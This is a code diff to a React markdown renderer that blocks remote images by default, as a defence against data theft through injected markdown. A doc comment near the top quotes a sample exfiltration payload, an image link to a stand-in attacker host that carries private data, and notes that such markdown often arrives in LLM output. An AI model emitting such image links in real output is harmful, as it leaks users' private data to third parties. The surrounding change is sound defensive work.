@@ -55,6 +55,15 @@ export interface MarkdownRendererProps {
    */
   onNavigate?: (href: string) => void;
   className?: string;
+  /**
+   * Remote (absolute / protocol-relative / `data:`) image policy. DEFAULT
+   * `"block"`: markdown is often LLM or third-party output, and an injected
+   * `![x](https://evil.tld/?d=<private data>)` would otherwise exfiltrate on
+   * render (zero-click). Blocked images render a non-loading alt-text
+   * placeholder (no URL, no href). Relative images still go through
+   * `resolveImage`. Pass `"allow"` ONLY for trusted, human-authored content.
+   */
+  remoteImages?: 'allow' | 'block';
 }
 
 function isAbsoluteUrl(href: string): boolean {
@@ -75,11 +84,20 @@ function ImagePlaceholder({ alt }: { alt?: string }) {
   );
 }
 
+function BlockedImage({ alt }: { alt?: string }) {
+  return (
+    <span className="inline-flex items-center gap-1.5 rounded-md border border-dashed border-border bg-muted/40 px-2 py-1 text-xs text-muted-foreground">
+      Imagem externa bloqueada{alt ? `: ${alt}` : ''}
+    </span>
+  );
+}
+
 export function MarkdownRenderer({
   content,
   resolveImage,
   onNavigate,
   className,
+  remoteImages = 'block',
 }: MarkdownRendererProps) {
   const components = React.useMemo<Components>(
     () => ({
@@ -164,7 +182,9 @@ export function MarkdownRenderer({
       img: ({ src, alt }) => {
         const raw = typeof src === 'string' ? src : '';
         if (!raw) return <ImagePlaceholder alt={alt} />;
-        const resolved = isAbsoluteUrl(raw) ? raw : resolveImage?.(raw);
+        const remote = isAbsoluteUrl(raw);
+        if (remote && remoteImages === 'block') return <BlockedImage alt={alt} />;
+        const resolved = remote ? raw : resolveImage?.(raw);
         if (!resolved) return <ImagePlaceholder alt={alt} />;
         return (
           <img
@@ -241,7 +261,7 @@ export function MarkdownRenderer({
         <td className="border-b border-border/60 px-3 py-2 text-foreground">{children}</td>
       ),
     }),
-    [resolveImage, onNavigate],
+    [resolveImage, onNavigate, remoteImages],
   );
 
   return (
